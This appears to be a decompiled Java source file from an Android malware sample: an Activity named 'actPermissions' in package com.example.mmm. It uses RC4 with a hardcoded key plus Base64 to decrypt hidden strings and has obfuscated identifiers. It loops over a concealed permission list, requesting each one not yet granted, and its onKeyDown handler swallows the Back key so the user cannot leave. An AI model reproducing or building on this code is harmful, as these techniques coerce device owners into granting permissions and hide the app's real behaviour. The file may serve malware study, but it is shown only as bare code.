package com.example.mmm.Activity;

import android.app.*;
import com.example.mmm.*;
import com.example.mmm.Utils.*;
import com.example.mmm.API.*;
import android.util.*;
import android.content.*;
import android.os.*;
import android.view.*;

public class actPermissions extends Activity
{
    constants consts;
    utils utl;
    
    public actPermissions() {
        super();
        this.consts = new constants();
        this.utl = new utils();
    }
    
    private String decrypt_str(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    protected void onCreate(final Bundle bundle) {
        super.onCreate(bundle);
        this.utl.SettingsWrite((Context)this, "SQ", "1");
        if (Build$VERSION.SDK_INT >= 23) {
            final String[] pentium$ = this.consts.pentium$;
            for (int length = pentium$.length, i = 0; i < length; ++i) {
                final String s = pentium$[i];
                if (this.checkCallingOrSelfPermission(s) != 0) {
                    this.utl.SettingsWrite((Context)this, "SQ", "1");
                    this.requestPermissions(new String[] { s }, 123);
                }
            }
        }
        this.finish();
    }
    
    protected void onDestroy() {
        super.onDestroy();
    }
    
    public boolean onKeyDown(final int n, final KeyEvent keyEvent) {
        return n == 4 || super.onKeyDown(n, keyEvent);
    }
    
    protected void onPause() {
        super.onPause();
    }
    
    protected void onResume() {
        super.onResume();
    }
    
    protected void onStop() {
        super.onStop();
    }
}
